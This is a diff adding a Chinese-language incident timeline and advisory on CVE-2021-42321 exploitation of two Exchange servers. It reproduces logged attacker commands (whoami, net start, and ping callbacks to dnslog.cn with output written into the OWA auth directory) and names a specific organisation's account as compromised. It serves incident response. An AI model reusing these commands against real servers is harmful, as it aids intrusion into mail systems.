@@ -1,0 +1,30 @@
+
++ 發現此主機遭執行惡意指令，目前攻擊者僅有執行探測指令。
+
++ `2021-11-09` 微軟釋出Exchange更新
++ `2021-11-21` 作者`testanull`公布PoC至github中
++ `2021-11-23 25:00:00` 開始出現新聞
++ `2021-11-23 13:05:53` `MAIL2`的`w3wp.exe`呼叫`cmd.exe`執行 `whoami > C:\"Program Files"\Microsoft\"Exchange Server"\V15\FrontEnd\HttpProxy\owa\auth\new.txt`
+
++ `2021-11-29 09:05:53` `MAIL2`的`w3wp.exe`呼叫`cmd.exe`執行 `whoami > C:\"Program Files"\Microsoft\"Exchange Server"\V15\FrontEnd\HttpProxy\owa\auth\new.txt`
++ `2021-11-29 10:13:55` 開出`MAIL2`的事件單
++ `2021-11-29 11:05:08` `MAIL1`的`w3wp.exe`呼叫`cmd.exe`執行`ping toj4t9.dnslog.cn -n 1 > C:\"Program Files"\Microsoft\"Exchange Server"\V15\FrontEnd\HttpProxy\owa\auth\new.txt
++ `2021-11-29 11:56:51` 開出`MAIL1`的事件單
++ `2021-11-29 14:11:09` `MAIL1`的`w3wp.exe`呼叫`cmd.exe`執行`net start > C:\"Program Files"\Microsoft\"Exchange Server"\V15\FrontEnd\HttpProxy\owa\auth\new.txt`
++ `2021-11-29 14:16:28` `MAIL1`的`w3wp.exe`呼叫`cmd.exe`執行`whoami > C:\"Program Files"\Microsoft\"Exchange Server"\V15\FrontEnd\HttpProxy\owa\auth\new.txt`
++ `2021-11-29 14:37:00` `MAIL1`的`w3wp.exe`呼叫`cmd.exe`執行`whoami > C:\"Program Files"\Microsoft\"Exchange Server"\V15\FrontEnd\HttpProxy\owa\auth\new.txt`
++ `2021-11-30 08:50:48` 客戶回覆已更新至最新版本
++ `2021-11-30 09:32:58` `MAIL2`的`w3wp.exe`仍然呼叫`cmd.exe`執行 `ping toj4t9.dnslog.cn -n 1 > C:\"Program Files"\Microsoft\"Exchange Server"\V15\FrontEnd\HttpProxy\owa\auth\new.txt`
++ `2021-11-30 09:33:42` `MAIL2`的`w3wp.exe`呼叫`cmd.exe`執行 `whoami > C:\"Program Files"\Microsoft\"Exchange Server"\V15\FrontEnd\HttpProxy\owa\auth\new.txt`
++ `2021-11-30 09:41:16` `MAIL2`的`w3wp.exe`呼叫`cmd.exe`執行 `ping zrtjcm.dnslog.cn -n 1 > C:\"Program Files"\Microsoft\"Exchange Server"\V15\FrontEnd\HttpProxy\owa\auth\new.txt`
++ `2021-11-30 11:00:35` 使用者確實更新十一月分之最新更新
++ 研判攻擊來源為webshell，建議您立即清查web access log以確認攻擊來源。
++ 後續收Log發現可以從`Application Log`中看到`Deserialize`失敗所引發之錯誤
++ 後續從Log中可以看到對應時間點有使用者帳號`TAOYUANAIRPORT\C58650`送出請求，並獲得伺服器回傳500，且短時間內共有四次此帳號送出請求，為`CVE-2021-42321`之特徵，`TAOYUANAIRPORT\C58650`密碼應已外洩。
++ 發出公告：近期本公司監控分析時，發現微軟11月修補的Microsoft Exchange Server安全漏洞『CVE-2021-42321』已遭駭客開採來入侵企業內部，該漏洞成功利用可直接讓攻擊者輕易入侵執行系統指令。事件發生時，IPaaS服務透過Intended Intrusion Hunting (IIH)機制偵測出未知攻擊進行通報，並妥善進行處置。
++ 受影響版本為：
+	+ Exchange Server 2019 CU11
+	+ Exchange Server 2019 CU10
+	+ Exchange Server 2016 CU22
+	+ Exchange Server 2016 CU21
++ 若您的Exchange Server為以上受影響版本，則強烈建議您儘速更新至最新版本。
